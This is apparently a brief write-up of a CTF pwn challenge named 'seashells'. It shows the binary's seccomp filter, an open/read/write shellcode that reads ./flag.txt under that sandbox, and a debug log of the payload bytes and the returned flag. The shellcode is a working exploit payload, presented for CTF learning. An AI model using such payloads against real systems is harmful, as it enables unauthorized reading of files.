# 沙箱
```
(pip_venv) ➜  seashells seccomp-tools dump ./seashells
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x09 0xffffffff  if (A != 0xffffffff) goto 0014
 0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013
 0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013
 0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013
 0008: 0x15 0x04 0x00 0x00000003  if (A == close) goto 0013
 0009: 0x15 0x03 0x00 0x00000009  if (A == mmap) goto 0013
 0010: 0x15 0x02 0x00 0x0000000b  if (A == munmap) goto 0013
 0011: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0013
 0012: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x06 0x00 0x00 0x00000000  return KILL

```
![](https://r2.20161023.xyz/pic/20250726123914505.png)


# shellcode
```
        /* open(file='./flag.txt', oflag=0, mode=0) */
        /* push b'./flag.txt\x00' */
        push 0x1010101 ^ 0x7478
        xor dword ptr [rsp], 0x1010101
        mov rax, 0x742e67616c662f2e
        push rax
        mov rdi, rsp
        xor edx, edx /* 0 */
        xor esi, esi /* 0 */
        /* call open() */
        push 2 /* 2 */
        pop rax
        syscall
        /* call read('rax', 'rsp', 0x100) */
        mov rdi, rax
        xor eax, eax /* SYS_read */
        xor edx, edx
        mov dh, 0x100 >> 8
        mov rsi, rsp
        syscall
        /* write(fd=1, buf='rsp', n=0x100) */
        push 1
        pop rdi
        xor edx, edx
        mov dh, 0x100 >> 8
        mov rsi, rsp
        /* call write() */
        push 1 /* 1 */
        pop rax
        syscall

```
# getshell
```
[DEBUG] Sent 0x41 bytes:
    00000000  68 79 75 01  01 81 34 24  01 01 01 01  48 b8 2e 2f  │hyu·│··4$│····│H·./│
    00000010  66 6c 61 67  2e 74 50 48  89 e7 31 d2  31 f6 6a 02  │flag│.tPH│··1·│1·j·│
    00000020  58 0f 05 48  89 c7 31 c0  31 d2 b6 01  48 89 e6 0f  │X··H│··1·│1···│H···│
    00000030  05 6a 01 5f  31 d2 b6 01  48 89 e6 6a  01 58 0f 05  │·j·_│1···│H··j│·X··│
    00000040  0a                                                  │·│
    00000041
[*] Switching to interactive mode
[DEBUG] Received 0x100 bytes:
    00000000  73 68 61 6b  74 69 63 74  66 7b 75 5f  67 30 74 5f  │shak│tict│f{u_│g0t_│
    00000010  77 68 40 74  5f 75 5f 77  31 35 68 33  64 5f 5f 74  │wh@t│_u_w│15h3│d__t│
    00000020  68 33 5f 73  33 40 73 68  33 31 31 5f  66 31 40 67  │h3_s│3@sh│311_│f1@g│
    00000030  7d c0 19 c6  aa 5c 00 00  00 90 e2 11  f9 76 00 00  │}···│·\··│····│·v··│
    00000040  00 90 e2 11  f9 76 00 00  68 79 75 01  01 81 34 24  │····│·v··│hyu·│··4$│
    00000050  01 01 01 01  48 b8 2e 2f  66 6c 61 67  2e 74 50 48  │····│H·./│flag│.tPH│
    00000060  89 e7 31 d2  31 f6 6a 02  58 0f 05 48  89 c7 31 c0  │··1·│1·j·│X··H│··1·│
    00000070  31 d2 b6 01  48 89 e6 0f  05 6a 01 5f  31 d2 b6 01  │1···│H···│·j·_│1···│
    00000080  48 89 e6 6a  01 58 0f 05  0a 3c ba 11  f9 76 00 00  │H··j│·X··│·<··│·v··│
    00000090  30 9a 98 9f  fc 7f 00 00  20 9a 98 9f  fc 7f 00 00  │0···│····│ ···│····│
    000000a0  00 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  │····│····│····│····│
    000000b0  04 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000d0  00 00 00 00  00 00 00 00  80 9a 98 9f  fc 7f 00 00  │····│····│····│····│
    000000e0  e4 55 30 00  00 00 00 00  c0 9a 98 9f  fc 7f 00 00  │·U0·│····│····│····│
    000000f0  7a af bb 11  f9 76 00 00  f0 a9 de 11  f9 76 00 00  │z···│·v··│····│·v··│
    00000100
shaktictf{u_g0t_wh@t_u_w15h3d__th3_s3@sh311_f1@g}\xc0\x19ƪ\\x00\x00\x00\x90\xe2\x11\xf9v\x00\x00\x00\x90\xe2\x11\xf9v\x00\x00hyu\x01\x01\x814$\x01\x01\x01\x01H\xb8./flag.tPH\x89\xe71\xd21\xf6j\x02X\x0f\x05H\x89\xc71\xc01Ҷ\x01H\x89\xe6\x0f\x05j\x01_1Ҷ\x01H\x89\xe6j\x01X\x0f\x05
<\xba\x11\xf9v\x00\x000\x9a\x98\x9f\xfc\x7f\x00\x00 \x9a\x98\x9f\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x9a\x98\x9f\xfc\x7f\x00\x00\xe4U0\x00\x00\x00\x00\x00\xc0\x9a\x98\x9f\xfc\x7f\x00\x00z\xaf\xbb\x11\xf9v\x00\x00\xf0\xa9\xde\x11\xf9v\x00\x00$ 
```

![](https://r2.20161023.xyz/pic/20250726125033773.png)